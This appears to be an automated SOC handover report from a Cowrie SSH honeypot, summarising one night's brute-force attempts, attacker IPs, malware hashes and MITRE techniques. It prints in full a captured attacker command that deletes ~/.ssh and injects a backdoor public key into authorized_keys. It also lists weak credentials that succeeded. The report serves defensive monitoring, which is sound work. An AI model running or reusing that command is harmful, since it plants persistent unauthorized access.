# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-24 |
| **Generated At** | 2026-03-24T04:18:29Z |
| **Shift Time** | 04:18 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **214** |
| Confirmed Threats | **98** |
| False Positives Filtered | **116** (54.2%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **18** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **210** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **77** |
| Unique Credential Pairs | **75** |
| Unique Usernames | **53** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 16 |
| `root` | 4 |
| `Guest` | 3 |
| `Operator` | 2 |
| `unknown` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 4 |
| `12345` | 3 |
| `password` | 3 |
| `123456` | 3 |
| `Passw0rd` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `user` | `user2014` | 1 |
| `Unknown` | `Passw0rd` | 1 |
| `ubuntu` | `ASD@2019` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123asd,./` | `40.81.244.142` | 2026-03-24T03:06:38 |
| `root` | `3245gs5662d34` | `40.81.244.142` | 2026-03-24T03:06:40 |
| `root` | `qq111111` | `40.81.244.142` | 2026-03-24T03:15:11 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.81.244.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **37** |
| High-Risk ASNs | **28** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS4760` | HKT Limited | 1 | HIGH |
| `AS58541` | Qingdao,266000 | 1 | HIGH |
| `AS48573` | PHAETON PLUS d.o.o | 1 | MEDIUM |
| `AS26496` | GoDaddy.com, LLC | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-01a5902d6f8e

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-03-24 03:06 |
| **Last Seen** | 2026-03-24 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 03:06:38` | `cowrie.session.connect` |
| `2026-03-24 03:06:38` | `cowrie.client.version` |
| `2026-03-24 03:06:38` | `cowrie.client.kex` |
| `2026-03-24 03:06:38` | `cowrie.login.success` |
| `2026-03-24 03:06:38` | `cowrie.session.params` |
| `2026-03-24 03:06:38` | `cowrie.command.input` |
| `2026-03-24 03:06:38` | `cowrie.command.failed` |
| `2026-03-24 03:06:38` | `cowrie.log.closed` |
| `2026-03-24 03:06:38` | `cowrie.session.params` |
| `2026-03-24 03:06:38` | `cowrie.command.input` |
| `2026-03-24 03:06:39` | `cowrie.session.file_download` |
| `2026-03-24 03:06:39` | `cowrie.log.closed` |
| `2026-03-24 03:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b33e9d3ee15

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-03-24 03:06 |
| **Last Seen** | 2026-03-24 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 03:06:40` | `cowrie.session.connect` |
| `2026-03-24 03:06:40` | `cowrie.client.version` |
| `2026-03-24 03:06:40` | `cowrie.client.kex` |
| `2026-03-24 03:06:40` | `cowrie.login.success` |
| `2026-03-24 03:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6aeea0ff4b5

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-03-24 03:15 |
| **Last Seen** | 2026-03-24 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 03:15:11` | `cowrie.session.connect` |
| `2026-03-24 03:15:11` | `cowrie.client.version` |
| `2026-03-24 03:15:11` | `cowrie.client.kex` |
| `2026-03-24 03:15:11` | `cowrie.login.success` |
| `2026-03-24 03:15:11` | `cowrie.session.params` |
| `2026-03-24 03:15:11` | `cowrie.command.input` |
| `2026-03-24 03:15:11` | `cowrie.command.failed` |
| `2026-03-24 03:15:11` | `cowrie.log.closed` |
| `2026-03-24 03:15:11` | `cowrie.session.params` |
| `2026-03-24 03:15:11` | `cowrie.command.input` |
| `2026-03-24 03:15:11` | `cowrie.session.file_download` |
| `2026-03-24 03:15:11` | `cowrie.log.closed` |
| `2026-03-24 03:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a35ebe770b3

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-03-24 03:15 |
| **Last Seen** | 2026-03-24 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 03:15:13` | `cowrie.session.connect` |
| `2026-03-24 03:15:13` | `cowrie.client.version` |
| `2026-03-24 03:15:13` | `cowrie.client.kex` |
| `2026-03-24 03:15:13` | `cowrie.login.success` |
| `2026-03-24 03:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `183.81.33[.]183` | **15** | 2026-03-24 01:53 | 2026-03-24 03:43 | 6m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.139.164[.]171` | **10** | 2026-03-24 03:38 | 2026-03-24 04:02 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `161.132.180[.]118` | **10** | 2026-03-24 03:56 | 2026-03-24 04:17 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.153.57[.]103` | **10** | 2026-03-24 03:40 | 2026-03-24 03:48 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.81.244[.]142` | **10** | 2026-03-24 03:01 | 2026-03-24 03:23 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `140.249.22[.]89` | **7** | 2026-03-24 03:40 | 2026-03-24 04:13 | 14m | 0 | `T1592` | 🟢 LOW |
| `3.149.230[.]178` | **6** | 2026-03-24 03:58 | 2026-03-24 04:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.72.47[.]83` | **2** | 2026-03-24 02:45 | 2026-03-24 02:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.178.83[.]104` | **2** | 2026-03-24 02:14 | 2026-03-24 02:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.147.248[.]23` | 1 | 2026-03-24 04:03 | 2026-03-24 04:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.230.176[.]152` | 1 | 2026-03-24 03:55 | 2026-03-24 03:55 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.3.43[.]242` | 1 | 2026-03-24 01:53 | 2026-03-24 01:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.124.96[.]19` | 1 | 2026-03-24 03:10 | 2026-03-24 03:11 | 30s | 0 | `T1592` | 🟢 LOW |
| `116.48.143[.]166` | 1 | 2026-03-24 02:39 | 2026-03-24 02:39 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.183.125[.]51` | 1 | 2026-03-24 02:47 | 2026-03-24 02:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.54.65[.]90` | 1 | 2026-03-24 02:32 | 2026-03-24 02:32 | 14s | 0 | `T1592` | 🟢 LOW |
| `180.76.115[.]202` | 1 | 2026-03-24 03:44 | 2026-03-24 03:44 | 4s | 0 | `T1592` | 🟢 LOW |
| `182.225.134[.]13` | 1 | 2026-03-24 02:49 | 2026-03-24 02:49 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.53.52[.]68` | 1 | 2026-03-24 02:20 | 2026-03-24 02:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.60.128[.]241` | 1 | 2026-03-24 03:47 | 2026-03-24 03:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.220.237[.]230` | 1 | 2026-03-24 01:55 | 2026-03-24 01:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.36.7[.]196` | 1 | 2026-03-24 04:05 | 2026-03-24 04:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `198.211.114[.]94` | 1 | 2026-03-24 03:03 | 2026-03-24 03:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `220.123.74[.]61` | 1 | 2026-03-24 02:00 | 2026-03-24 02:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `36.154.134[.]146` | 1 | 2026-03-24 02:12 | 2026-03-24 02:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]42` | 1 | 2026-03-24 03:26 | 2026-03-24 03:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]11` | 1 | 2026-03-24 03:17 | 2026-03-24 03:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]52` | 1 | 2026-03-24 03:17 | 2026-03-24 03:17 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.206.201[.]253` | 1 | 2026-03-24 04:05 | 2026-03-24 04:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.121.48[.]198` | 1 | 2026-03-24 03:47 | 2026-03-24 03:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.143.42[.]170` | 1 | 2026-03-24 04:04 | 2026-03-24 04:05 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.183.125[.]51` | PL | blueconnect | **100** ⚠️ | 10 |
| `183.220.237[.]230` | CN | China Mobile Communications Corporation | **100** ⚠️ | 32 |
| `117.72.47[.]83` | CN | Beijing Jingdong 360 Degree E-commerce Co., Ltd. | **100** ⚠️ | 0 |
| `112.124.96[.]19` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 15 |
| `182.60.128[.]241` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 1 |
| `182.53.52[.]68` | TH | TOT Public Company Limited | **100** ⚠️ | 50 |
| `118.139.164[.]171` | SG | Virtual Private Hosting Service | **100** ⚠️ | 50 |
| `103.230.176[.]152` | IN | AXOM INTERNET SERVICES PRIVATE LIMITED | **100** ⚠️ | 50 |
| `183.81.33[.]183` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `49.206.201[.]253` | IN | ACT Hyderabad | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 94 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 73 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (116 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 108 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 214 cases |
| Tool 34  | Credential Extractor        | ✅ 77 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 116 filtered (54.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 31 recon entry/entries in table (9 group(s) consolidating 72 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-24T04:18:29Z_
